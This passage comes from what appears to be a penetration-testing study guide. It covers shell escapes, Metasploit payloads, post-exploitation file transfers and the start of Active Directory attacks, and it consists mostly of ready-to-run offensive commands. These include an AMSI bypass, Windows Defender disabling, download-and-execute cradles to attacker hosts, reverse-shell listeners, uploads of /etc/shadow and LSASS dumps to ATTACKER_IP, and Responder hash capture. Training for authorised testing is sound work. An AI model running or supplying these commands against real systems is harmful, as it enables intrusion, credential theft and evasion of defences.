| Ruby | `ruby: exec "/bin/sh"` | If Ruby available |
| Lua | `lua: os.execute('/bin/sh')` | Common on embedded systems |
| AWK | `awk 'BEGIN {system("/bin/sh")}'` | Nearly ubiquitous on Unix |
| Find trick | `find . -exec /bin/sh \; -quit` | Works even when other methods fail |
| Vim escape | `vim -c ':!/bin/sh'` then `:set shell=/bin/bash` then `:shell` | Requires vim installed |

```bash
# Check what interpreters are available
which perl ruby lua awk python python3 vim
```

## Non-TTY Shell Concept

A **non-TTY shell** lacks a terminal emulator. Characteristics:
- No job control (no `fg`, `bg`, `Ctrl+Z`)
- No signal handling
- No terminal size
- No tab completion

**Why `su`/`sudo`/`sudo -l` fail:**
1. `su` requires a TTY to read password from `/dev/tty`
2. `sudo` enforces `requiretty` by default
3. Service accounts (apache, www-data) configured with `/usr/sbin/nologin`

**Key: `sudo -l` requires a stable interactive shell** — will fail in non-TTY shells.

**Check:** `tty` → "not a tty" means you need to upgrade.

## CMD vs PowerShell Decision Framework

| Factor | CMD | PowerShell |
|--------|-----|------------|
| **When to use** | Older hosts, simple interactions, batch files, exec policy blocks, stealth | Cmdlets, .NET objects, cloud services, when stealth less concern |
| **I/O model** | Text-based | .NET object-based |
| **Command history** | No | Yes (Get-History, F7) |
| **Execution Policy** | Not affected | Affected (Bypass/Unrestricted) |
| **UAC** | Not affected | Affected |
| **Availability** | All Windows (XP+) | Not on XP/older |
| **Logging** | Minimal | Extensive (ScriptBlock, Module, Transcription) |
| **AV Detection** | Less likely | More likely (AMSI) |
| **Remote Execution** | Limited (psexec, wmic) | Built-in (Enter-PSSession via WinRM) |

### Quick Decision Guide
```
Windows XP/2000 or older? → CMD
PowerShell blocked by exec policy? → CMD (or bypass: -ExecutionPolicy Bypass)
Need .NET access / advanced features? → PowerShell
Stealth primary concern? → CMD
Otherwise → PowerShell (faster, more powerful)
```

### PowerShell Execution Policy Bypass
```powershell
powershell -ExecutionPolicy Bypass -Command "Get-Process"
powershell -ExecutionPolicy Bypass -NoProfile -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
```

### AMSI Bypass
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

## PowerShell Core on Linux
```bash
# Install on Linux
sudo snap install powershell --classic
pwsh  # Launch PowerShell Core
pwsh -Command "Get-Process | Sort-Object CPU -Descending | Select-Object -First 10"
```
- Avoids Windows-targeted AV/EDR
- Cross-platform engagements
- Native cloud management modules (Az, AWSPowerShell)

## WSL as Attack Vector
| Capability | Security Impact |
|------------|----------------|
| Network requests NOT parsed by Windows Firewall | WSL2 has own virtual network adapter |
| Network requests NOT scanned by Defender | Traffic from WSL not inspected |
| Run Linux binaries natively | Compile/execute Linux tools without dual-boot |
| Python3 via WSL | Full Python without installing Python for Windows |
| File system access | Access Windows files via `/mnt/c/` |
| EDR blind spot | Limited visibility into WSL process execution |

```cmd
:: Check WSL
wsl --list
Get-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux
```

## GNU Netcat vs Ncat

| Feature | GNU Netcat | Ncat (Nmap) |
|---------|------------|-------------|
| **Close on EOF** | `-q 0` | `--send-only`, `--recv-only` |
| **SSL/TLS** | No | Yes (`--ssl`) |
| **IPv6** | Limited | Full (`-6`) |
| **SOCKS Proxy** | No | Yes (`--proxy-type socks4/socks5`) |
| **HTTP Proxy** | No | Yes (`--proxy-type http`) |
| **Connection Brokering** | No | Yes (`--broker`) |
| **Access Control** | No | Yes (`--allow`, `--deny`) |
| **Chat Mode** | No | Yes (`--chat`) |

**On Pwnbox:** `nc`, `ncat`, `netcat` ALL point to Ncat.

```bash
# Ncat SSL
ncat -lvp 443 --ssl -e /bin/bash
ncat --ssl 10.10.14.1 443

# Ncat send/recv only
ncat --send-only 10.10.14.1 4444 < file.txt
ncat --recv-only -lvp 4444 > received_file.txt

# Ncat brokering
ncat -lvp 8080 --broker --keep-open
```

## Payload Naming Convention
`<platform>/<arch>/<type>/<connection>` — e.g., `windows/x64/meterpreter/reverse_https`

| Directory | Platform |
|-----------|----------|
| `linux/` | Linux (x86, x64, ARM, MIPS) |
| `windows/` | Windows (x86, x64) |
| `osx/` | macOS |
| `android/` | Android |
| `apple_ios/` | iOS |
| `java/` | Java |
| `php/` | PHP |
| `nodejs/` | Node.js |
| `python/` | Python |
| `mainframe/` | IBM z/OS |
| `bsd/` | FreeBSD, OpenBSD, NetBSD |
| `unix/` | Generic Unix |
| `multi/` | Multi-platform |

## MSFVenom Flags Deep Breakdown
| Flag | Description |
|------|-------------|
| `-p` | Payload |
| `-f` | Output format (elf, exe, raw, perl, python, ruby, asp, aspx, jsp, war, dll, macho, vba, psh) |
| `>` | File redirection |
| `LHOST` | Attacker IP |
| `LPORT` | Listener port |
| `-e` | Encoder |
| `-i` | Encoding iterations |
| `-b` | Bad characters |
| `--platform` | Target platform |
| `-a` | Architecture |
| `--smallest` | Smallest possible payload |
| `-k` | Keep template functioning |
| `-x` | Custom executable template |
| `EXITFUNC` | Exit function (thread, process, seh, none) |
| `PrependMigrate` | Auto-migrate to another process |
| `PrependMigrateProc` | Process name to migrate to |

## Staged vs Stageless Decision Framework
| Factor | Staged (`/`) | Stageless (`_`) |
|--------|-------------|----------------|
| **Bandwidth** | Better (small initial stager) | Worse (full payload at once) |
| **Reliability** | Needs reliable connection | Better for unstable connections |
| **Evasion** | More network traffic (stages) | Less network traffic |
| **Use case** | Space-constrained exploits | Web shells, stable access |

```
Space-constrained exploit? → Staged
Unstable network? → Stageless
AV/EDR evasion primary concern? → Stageless
Otherwise → Either (staged is traditional default)
```

## Stagers, Stages & Middle Stagers
- **Stagers** (~300-800 bytes): Small reliable code that initiates outbound connection, sets up channel for stage delivery. Types: reverse_tcp, bind_tcp, reverse_http, reverse_https, findtag
- **Stages** (100-300KB): Downloaded by stagers, advanced features no size limits (Meterpreter, VNC). Components: stdapi, priv, extapi, kiwi, sniffer, vnc, incognito, powershell
- **Middle Stagers**: Handle partial recv() calls for large payloads, allocate RWX memory, error handling/retries

## Windows NX vs NO-NX Stagers
| Factor | NO-NX Stager | NX Stager |
|--------|-------------|-----------|
| **Size** | Smaller (~300-400B) | Larger (~500-700B) |
| **Memory** | Writes to existing executable | Allocates RWX via VirtualAlloc |
| **Compatibility** | Older systems without DEP | Modern systems with DEP |
| **Default** | Legacy | YES — NX + Win7 compatible |

## Meterpreter Architecture
- **DLL injection** — injected into existing process, no new process created
- **In-memory only** — no disk traces, forensically clean
- **AES-256 encryption** — all communication encrypted
- **Dynamic load/unload** — extensions loaded at runtime
- **Process migration** — survive reboots/crashes

### Initialization Sequence
1. Target executes initial stager (bind/reverse/findtag/passivex)
2. Stager loads DLL with Reflective Loader (handles loading/injection)
3. Meterpreter core initializes, establishes AES link, sends GET
4. Metasploit configures client
5. Extensions loaded (always `stdapi`, `priv` if admin rights)

### Reflective DLL Injection vs Traditional
| Traditional | Reflective |
|------------|------------|
| Requires WriteProcessMemory | Writes itself to memory |
| Requires LoadLibrary | Self-maps without OS loader |
| Visible to EDR hooks | Bypasses LoadLibrary monitoring |
| Requires import table | Self-contained |

## Why Port 443
- HTTPS rarely blocked by outbound firewalls
- Commonly allowed for web browsing
- Blends with legitimate HTTPS traffic
- **Caveat:** DPI/Layer 7 firewalls may detect non-HTTPS on 443 (MSF reverse_https doesn't do real TLS handshake)

## Windows Defender Disable
```powershell
# Real-time disable (requires Admin)
Set-MpPreference -DisableRealtimeMonitoring $true
Get-MpPreference | Select-Object DisableRealtimeMonitoring

# Check Tamper Protection
Get-MpComputerStatus | Select-Object IsTamperProtected

# Additional disables
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableBehaviorMonitoring $true

# Add exclusions
Add-MpPreference -ExclusionPath "C:\Temp"
Add-MpPreference -ExclusionProcess "C:\Temp\payload.exe"
```

## Web Shell Toolkits

### Laudanum
- Location: `/usr/share/laudanum/`
- Platforms: ASP, ASPX, JSP, PHP, ColdFusion
- Edit `allowedIps` array to restrict access
- **WARNING:** ASCII art header is heavily signatured — remove it!

### Antak Webshell (Nishang)
- Location: `/usr/share/nishang/Antak-WebShell/`
- ASP.NET with PowerShell UI
- Features: file upload/download, SQL queries, encode-and-execute

### WhiteWinterWolf PHP Shell
- Burp content-type bypass: `application/x-php` → `image/gif`

### Web Shell Considerations
- Web apps may auto-delete files after pre-defined periods
- Limited interactivity: no `cd`, chained commands may fail
- Browser instability
- **Always convert to proper reverse shell ASAP**

## TTL-Based OS Fingerprinting
| OS | TTL |
|----|-----|
| Windows | 32 or 128 (typically 128) |
| Linux | 64 |
| Cisco | 255 |
| FreeBSD | 64 |
| macOS | 64 |

```bash
ping <target>  # Look at TTL in response
```

## Windows Prominent Exploits Catalog
| CVE | Name | Impact |
|-----|------|--------|
| MS08-067 | NetAPI | Conficker, Stuxnet — Server service RPC overflow |
| MS17-010 | EternalBlue | WannaCry, NotPetya — SMBv1 RCE |
| CVE-2019-0708 | BlueKeep | RDP RCE, wormable, pre-auth |
| CVE-2020-1350 | Sigred | DNS Server RCE, CVSS 10.0, wormable |
| CVE-2020-1472 | Zerologon | DC takeover, no auth required, CVSS 10.0 |
| CVE-2021-1675 | PrintNightmare | Print Spooler RCE, unauthenticated |
| CVE-2021-36934 | SeriousSam | SAM/SYSTEM hive access via VSS |

## Social Engineering Delivery Vectors
- **Email attachments:** Malicious Office docs (macros), PDF exploits, .exe/.scr disguised as legitimate, password-protected archives, LNK files, ISO/IMG files
- **Download links:** Phishing websites, drive-by downloads, cloud storage links (trusted domains), Pastebin scripts, GitHub Gists
- **USB dead drops:** Infected drives, Rubber Ducky, Bash Bunny, O.MG Cable
- **Combined with MSF:** `exploit/windows/fileformat/office_*`, `exploit/windows/fileformat/adobe_*`, msfvenom-generated payloads

## Terminal Emulator Catalog
| Platform | Terminals |
|----------|-----------|
| **Windows** | Windows Terminal, cmder, PuTTY, kitty, Alacritty |
| **Linux** | xterm, GNOME Terminal, MATE Terminal, Konsole, Terminator |
| **macOS** | iTerm2, Terminal.app, Kitty, Alacritty |

## Command Language Interpreter Identification
```bash
# Linux
echo $SHELL           # Check SHELL variable
env | grep SHELL      # All env vars
ps aux | grep -E '(bash|sh|zsh)'  # Running processes
cat /etc/shells       # Available shells

# Windows
echo %COMSPEC%        # Should show cmd.exe path
tasklist | findstr /i "cmd powershell"  # Running interpreters
```

| Interpreter | Prompt Character |
|-------------|-----------------|
| bash | `$` |
| root bash | `#` |
| zsh | `%` |
| CMD | `>` |
| PowerShell | `PS ...>` |

## Bind Shell Challenges
| Challenge | Impact |
|-----------|--------|
| Pre-existing listener required | If no listener, connection fails |
| Strict incoming firewall rules | Non-standard ports blocked |
| NAT/PAT blocking | External attacker cannot reach internal IPs |
| OS firewalls | Windows Firewall, iptables block incoming |
| IDS/IPS detection | New listeners flagged |

**When bind shells work:** Internal network access, pivoting, DMZ hosts, no firewall environments. **Default to reverse shells** in almost all scenarios.


---

# Phase 7: Post-Exploitation — File Transfers

## 7.1 Linux File Transfers

### Download Methods
```bash
# wget
wget http://<attacker_ip>/<filename>

# cURL
curl http://<attacker_ip>/<filename> -o <filename>

# Fileless execution (cURL)
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash

# Fileless execution (wget)
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

# Bash /dev/tcp
exec 3<>/dev/tcp/10.10.10.32/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n" >&3
cat <&3

# SCP
scp plaintext@192.168.49.128:/root/myroot.txt .
```

### Upload Methods
```bash
# Python HTTP server (attacker side)
python3 -m http.server 8000

# SCP upload
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/

# Python upload server
python3 -m pip install --user uploadserver
python3 -m uploadserver

# Upload via cURL
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

### Base64 Encoding (no network needed)
```bash
# Encode (attacker)
cat id_rsa | base64 -w 0; echo

# Decode (target)
echo -n 'LS0tLS1CRUdJTi...' | base64 -d > id_rsa

# Verify integrity
md5sum shell    # run on BOTH machines
```

## 7.2 Windows File Transfers

### PowerShell Downloads
```powershell
# DownloadFile method
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\PowerView.ps1')

# Fileless execution (IEX)
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

# Invoke-WebRequest
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

# Aliases (iwr, curl, wget all work)
iwr http://10.10.10.32/nc.exe -OutFile nc.exe
```

### PowerShell Common Errors & Fixes
```powershell
# IE first-launch config not completed
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX

# SSL/TLS certificate not trusted
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### SMB Downloads (Impacket SMB Server)
```bash
# Attacker — create SMB server
sudo impacket-smbserver share -smb2support /tmp/smbshare

# Target — copy file
copy \\192.168.220.133\share\nc.exe

# With authentication
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
net use n: \\192.168.220.133\share /user:test test
```

### FTP Downloads
```bash
# Attacker — FTP server
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21

# Target — download
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')

# Via FTP command file
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

### Windows Upload Methods
```powershell
# Base64 encode
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

# Decode (Linux attacker)
echo IyBDb3B5cmlnaHQ... | base64 -d > hosts

# PowerShell upload via uploadserver
pip3 install uploadserver
python3 -m uploadserver

IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://10.10.15.6:8000/upload -File C:\Users\htb-student\AppData\Local\Temp\lsass.DMP

# SMB upload
copy C:\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\

# FTP upload
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

### RDP Drive Redirection
```bash
# Attacker — connect with drive mapping
xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /drive:loot,/home/htb-ac-2081772/lab

# Target — copy to shared drive
copy C:\Users\mlefay\AppData\Local\Temp\lsass.DMP \\tsclient\loot\
```

## 7.3 File Transfer via Code (Polyglot Downloads)

### Python
```bash
# Python 2
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'

# Python 3
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

### PHP
```bash
# file_get_contents
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'

# fopen
php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

# Pipe directly to bash
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

### Ruby, Perl, JavaScript, VBScript
```bash
# Ruby
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'

# Perl
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'

# JavaScript (wget.js)
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1

# VBScript (wget.vbs)
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

## 7.4 Netcat/Ncat File Transfers

```bash
# Target — listening (receiving)
ncat -l -p 8000 --recv-only > SharpKatz.exe

# Attacker — sending
nc -q 0 192.168.49.128 8000 < SharpKatz.exe

# Reverse direction — attacker listening (sending)
sudo nc -l -p 443 -q 0 < SharpKatz.exe

# Target — receiving
nc 192.168.49.128 443 > SharpKatz.exe

# Via /dev/tcp
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

## 7.5 PowerShell Session File Transfer (WinRM)

When you have WinRM access between two Windows hosts:

```powershell
# Confirm WinRM port TCP 5985 is open on target
Test-NetConnection -ComputerName DATABASE01 -Port 5985

# Create a PowerShell remoting session
$Session = New-PSSession -ComputerName DATABASE01

# Copy file FROM localhost TO remote session
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\

# Copy file FROM remote session TO localhost
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

## 7.6 Living Off The Land (LOLBAS / GTFOBins)

### Windows LOLBAS
```cmd
# certreq — upload file to attacker
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini

# bitsadmin — download
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"

# certutil — download
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```

### Linux GTFOBins
```bash
# OpenSSL — transfer file
# Attacker: create cert
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
# Attacker: serve file
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
# Target: receive file
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

## 7.7 File Encryption (for Sensitive Data Exfiltration)

### Linux — OpenSSL AES-256
```bash
# Encrypt
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

# Decrypt
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

### Windows — Invoke-AESEncryption
```powershell
Import-Module .\Invoke-AESEncryption.ps1
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
```

## 7.8 Evading Detection

```powershell
# Change User Agent in PowerShell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```


---

## SUPPLEMENTARY: File Transfers — Advanced Reference

# ADDENDUM 03: File Transfers — Advanced Techniques

## PowerShell System.Net.WebClient Full Methods
| Method | Description |
|--------|-------------|
| `OpenRead(url)` | Open stream to read from URL |
| `OpenReadAsync(url)` | Async version |
| `DownloadData(url)` | Download as byte array |
| `DownloadDataAsync(url)` | Async version |
| `DownloadFile(url, file)` | Download to file |
| `DownloadFileAsync(url, file)` | Async version |
| `DownloadString(url)` | Download as string |
| `DownloadStringAsync(url)` | Async version |

## PowerShell SSL/TLS Bypass
```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

## PowerShell -UseBasicParsing
```powershell
Invoke-WebRequest -Uri "http://IP/file.exe" -OutFile "file.exe" -UseBasicParsing
# Bypasses IE first-launch configuration requirement
```

## User Agent Detection & Evasion
| Tool | User Agent |
|------|-----------|
| PowerShell Invoke-WebRequest | `Mozilla/5.0 (Windows NT...WindowsPowerShell/5.1)` |
| WinHttpRequest | Similar to above |
| Msxml2 | `Mozilla/4.0 (compatible; MSIE...)` |
| Certutil | `Microsoft-CryptoAPI/10.0` |
| BITS | `Microsoft BITS/7.8` |

```powershell
# Change UA
$UA = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest -Uri "http://IP/file.exe" -OutFile "file.exe" -UserAgent $UA
```

## Harmj0y PowerShell Download Cradles
Reference: https://gist.github.com/HarmJ0y/bb48307ffa663256e239
- Proxy-aware cradles (inherit system proxy settings)
- No disk touch options
- Multiple transports: WebClient, WebRequest, WinHTTP, COM, BITS

```powershell
# Proxy-aware download
$WC = New-Object System.Net.WebClient
$WC.Proxy = [System.Net.WebRequest]::DefaultWebProxy
$WC.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$WC.DownloadString("http://example.com/payload")
```

## FTP Non-Interactive (Command File)
```cmd
echo open 10.10.14.10 21> ftpcommand.txt
echo USER anonymous anonymous>> ftpcommand.txt
echo binary>> ftpcommand.txt
echo GET file.exe>> ftpcommand.txt
echo bye>> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

## WebDAV over HTTP/S
```bash
# Attacker: Setup
pip3 install wsgidav
wsgidav --host=0.0.0.0 --port=80 --root=/path/to/share --auth=anonymous

# Target: Mount
net use Z: http://ATTACKER_IP/
# DavWWWRoot = special Windows Shell keyword (no actual folder)
# SMB over HTTP fallback when port 445 blocked
```

## BITS (Background Intelligent Transfer Service)
```cmd
# CMD
bitsadmin /transfer mydownload http://ATTACKER_IP/file.exe C:\Users\Public\file.exe

# PowerShell
Import-Module bitstransfer
Start-BitsTransfer -Source "http://ATTACKER_IP/file.exe" -Destination "C:\Users\Public\file.exe"
# "Intelligent" — adjusts bandwidth to minimize foreground impact
```

## Certutil (AMSI Warning)
```cmd
certutil.exe -verifyctl -split -f http://ATTACKER_IP/file.exe
certutil -urlcache -split -f http://ATTACKER_IP/file.exe
# WARNING: AMSI now detects certutil download as malicious
```

## LOLBAS Project
| Binary | Download | Upload |
|--------|----------|--------|
| CertReq.exe | `certreq -Post URL -config "outfile"` | `certreq -Post -config URL infile "dummy"` |
| GfxDownloadWrapper.exe | Version-specific Intel Graphics download utility | N/A |
Reference: https://lolbas-project.github.io/

## GTFOBins File Transfer
- Search syntax: `+file download` or `+file upload`
- Notable: OpenSSL for encrypted transfer, curl, wget, scp, rsync, nc, socat, base64, python, perl

## Bash /dev/tcp
```bash
# Bash 2.04+ built-in (requires --enable-net-redirections)
exec 3<>/dev/tcp/ATTACKER_IP/PORT
echo -e "GET /file HTTP/1.1\r\nHost: ATTACKER_IP\r\n\r\n" >&3
cat <&3
# No wget/curl needed!
```

## JavaScript/VBScript Download Cradles
```cmd
# wget.js
# var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
# WinHttpReq.Open("GET", WScript.Arguments(0), false);
# WinHttpReq.Send();
# var BinStream = new ActiveXObject("ADODB.Stream");
# BinStream.Type = 1; BinStream.Open();
# BinStream.Write(WinHttpReq.ResponseBody);
# BinStream.SaveToFile(WScript.Arguments(1));
cscript.exe /nologo wget.js http://ATTACKER_IP/file.exe output.exe

# wget.vbs — similar with Microsoft.XMLHTTP and Adodb.Stream
cscript.exe /nologo wget.vbs http://ATTACKER_IP/file.exe output.exe
```

## OpenSSL File Transfer ("nc style")
```bash
# Create cert
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 1 -out cert.pem

# Serve file
openssl s_server -quiet -accept 443 -cert cert.pem -key key.pem < file

# Receive file
openssl s_client -connect ATTACKER_IP:443 -quiet > file
```

## HTTPS Upload Server
```bash
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 1 -nodes
python3 -m pip install uploadserver
python3 -m uploadserver --server-certificate cert.pem --server-certificate-key key.pem
curl -X POST https://ATTACKER_IP/upload -F 'files=@/etc/passwd' --insecure
```

## Nginx PUT Upload Server
```nginx
server { listen 9001; location / { root /tmp; dav_methods PUT; client_max_body_size 100m; } }
```
```bash
curl -T /etc/passwd http://ATTACKER_IP:9001/dir/file.txt
```

## PowerShell Remoting (WinRM) File Transfer
```powershell
$session = New-PSSession -ComputerName TARGET -Credential $cred
Copy-Item -ToSession $session -Path "./file.exe" -Destination "C:\Users\Public\file.exe"
Copy-Item -FromSession $session -Path "C:\Target\secret.txt" -Destination "./secret.txt"
# Useful when HTTP/HTTPS/SMB are all blocked
```

## RDP Drive Mounting from Linux
```bash
xfreerdp /v:TARGET /u:USER /p:PASS /drive:loot,/home/attacker/lab
# Access on target: \\tsclient\loot
# NOTE: Mounted drives NOT accessible to other users even if they hijack RDP session
```

## SMB Guest Access Blocking (Modern Windows)
```bash
# New Windows blocks unauthenticated guest access
# Workaround:
impacket-smbserver share /path/to/share -username user -password pass
# Target:
net use Z: \\ATTACKER_IP\share /user:user pass
```

## File Integrity Verification
```bash
# Linux
md5sum file.exe
# Windows
certutil -hashfile file.exe MD5
Get-FileHash -Algorithm md5 file.exe
# Cross-platform: hash before → hash after → compare
```

## File Encryption
```bash
# Linux
openssl enc -aes256 -iter 100000 -pbkdf2 -in file -out file.enc
openssl enc -aes256 -d -iter 100000 -pbkdf2 -in file.enc -out file

# Windows
# Invoke-AESEncryption.ps1 — AES-256 with key-based protection
```

## Data Exfiltration Guidance
> **WARNING:** Do NOT exfiltrate PII, financial data, trade secrets. Create dummy data mimicking client's protected data for DLP testing only.

## Temporary SSH Accounts
```bash
useradd -m -s /bin/bash tempuser && echo "tempuser:temppass" | chpasswd
# After engagement:
userdel -r tempuser
```

## Python/PHP/Ruby Mini Web Servers
```bash
python3 -m http.server          # Port 8000
python2.7 -m SimpleHTTPServer   # Port 8000
php -S 0.0.0.0:8000            # PHP 5.4+
ruby -run -ehttpd . -p8000     # Ruby
```

## Python3 Requests Upload One-Liner
```python
python3 -c 'import requests;requests.post("http://IP/upload",files={"files":open("/etc/passwd","rb")})'
```

## File Transfer Method Comparison
| Method | Auth | Binary Safe | Stealth | Target OS |
|--------|------|-------------|---------|-----------|
| HTTP GET | No | Yes | Low | All |
| HTTPS | No | Yes | Medium | All |
| SMB | Optional | Yes | Medium | Windows |
| FTP | Optional | Yes (binary) | Low | All |
| TFTP | No | Yes | Low | All |
| SCP | Yes | Yes | High | Linux |
| WinRM | Yes | Yes | High | Windows |
| RDP Drive | Yes | Yes | High | Windows |
| WebDAV | Optional | Yes | Medium | Windows |
| BITS | No | Yes | Medium | Windows |
| /dev/tcp | No | Yes | Low | Linux |


---

# Phase 8: Active Directory Enumeration & Attacks

## 8.1 AD Tool Arsenal

| Tool | Platform | Purpose |
|------|----------|---------|
| **PowerView / SharpView** | PowerShell / .NET | AD situational awareness, user/group/computer enumeration |
| **BloodHound + SharpHound** | GUI + PowerShell/C# | Visual AD attack path mapping |
| **BloodHound.py** | Python (Linux) | Linux-based BloodHound data collector |
| **Kerbrute** | Go | Kerberos pre-auth user enumeration & password spraying |
| **Impacket toolkit** | Python | SMB, WMI, Kerberos, MSSQL, secrets dumping |
| **Responder** | Python (Linux) | LLMNR/NBT-NS/MDNS poisoning |
| **Inveigh** | PowerShell/C# | Windows-based MITM poisoning |
| **CrackMapExec (CME/nxc)** | Python (Linux) | SMB/WMI/WinRM/MSSQL enumeration & attacks |
| **Rubeus** | C# | Kerberos abuse (tickets, roasting) |
| **Mimikatz** | C# | Credential extraction, pass-the-hash, ticket extraction |
| **Snaffler** | C# | Credential hunting across AD file shares |
| **LAPSToolkit** | PowerShell | LAPS auditing & exploitation |
| **windapsearch** | Python | LDAP-based AD enumeration |
| **enum4linux-ng** | Python | SMB/Windows enumeration with JSON/YAML export |

## 8.2 External AD Recon (No Credentials)

### What to Look For
| Data Point | What to Find |
|---|---|
| IP Space | ASN, netblocks, cloud presence, DNS records |
| Domain Info | Subdomains, mail servers, VPN portals, defenses |
| Schema Format | Email format, AD usernames, password policies |
| Data Disclosures | Public files (pdf, docx, xlsx) with internal links/creds |
| Breach Data | Leaked usernames/passwords |

### Enumeration Flow
1. BGP Toolkit → get IP, mail server, nameservers
2. viewdns.info → validate IP/domain
3. nslookup → verify nameservers, discover new IPs
4. Google Dorks → hunt public files & email addresses
5. Browse company website → contact pages, embedded docs
6. LinkedIn scraping → build username list
7. Dehashed → hunt breach data for valid creds

> **Always confirm written scope** before testing any external service. 3rd-party hosted infra (AWS, Azure) may need prior written approval.

## 8.3 LLMNR/NBT-NS Poisoning

### How It Works
1. A host tries to connect to `\\printer01.inlanefreight.local` but types it wrong
2. DNS responds: host unknown
3. Host broadcasts: "Who is printer01?"
4. Responder replies: "I am!"
5. Victim sends NTLMv2 hash to attacker
6. Hash is cracked offline or relayed

### Responder (Linux)
```bash
# Full poisoning (default)
sudo responder -I tun0

# Analyze mode (passive — no poisoning)
sudo responder -I tun0 -A

# Force NTLM authentication (use sparingly — triggers login prompts)
sudo responder -I tun0 -F

# WPAD rogue proxy + fingerprint
sudo responder -I tun0 -wf

# Cracking NTLMv2 hashes
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```

> **Best practice:** Start Responder in a tmux window and let it run while you do other enumeration. Maximize hash collection time.

### Inveigh (Windows)
```powershell
# PowerShell version
Import-Module .\Inveigh.ps1
